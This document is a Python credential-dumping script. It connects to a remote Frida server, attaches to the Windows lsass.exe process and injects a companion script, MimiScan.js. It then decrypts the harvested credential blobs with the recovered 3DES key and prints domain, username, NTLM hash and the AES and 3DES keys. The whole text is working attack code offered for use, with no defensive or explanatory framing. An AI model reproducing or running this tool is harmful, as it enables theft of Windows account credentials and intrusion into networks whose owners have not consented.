#!/usr/bin/env python3
import sys, time, frida
import binascii
import pyDes

fd = open("MimiScan.js", "r")
inject_script = fd.read()
fd.close()

target = sys.argv[1] + ":27042"
device = frida.get_device_manager().add_remote_device(target)

session = device.attach("lsass.exe")
script = session.create_script(inject_script)

credentials = []
keys = {"aes": None, "aes_iv": None, "3des": None}

# Receive messages from MimiScan.js, don't attempt decryption until all messages have been received.
def on_message(message, data):
	if "payload" not in message:
		return
	payload = message["payload"]
	if payload["type"] == "credentials":
		credential = {}
		credential["domain"] = payload["domain"]
		credential["username"] = payload["username"]
		credential["crypto"] = data
		credentials.append(credential)
	if payload["type"] == "aeskey":
		keys["aes"] = data
	if payload["type"] == "aes_iv":
		keys["aes_iv"] = data
	if payload["type"] == "3deskey":
		keys["3des"] = data

def blob2hex(blob):
	return binascii.hexlify(blob).decode("ascii").upper()
		
def decrypt_credentials(credential, keys):
	# Currently only 3DES is supported.
	decryptor = pyDes.triple_des(keys["3des"], pyDes.CBC)
	decrypted = decryptor.decrypt(credential["crypto"])
	ntlm = decrypted[74:90]
	
	print("User: %s\\%s" % (credential["domain"], credential["username"]))
	print("NTLM Hash: %s" % blob2hex(ntlm))
	print("AES Key: %s" % blob2hex(keys["aes"]))
	print("AES IV: %s" % blob2hex(keys["aes_iv"]))
	print("3DES Key: %s" % blob2hex(keys["3des"]))
	print("\n")

script.on('message', on_message)
script.load()

print("Press enter to attempt decryption of recovered credentials...")
input()

if not all([value is not None for value in keys.values()]):
	print("Not all keys were retrieved from memory :( try again?")
	sys.exit(1)
	
for credential in credentials:
	decrypt_credentials(credential, keys)
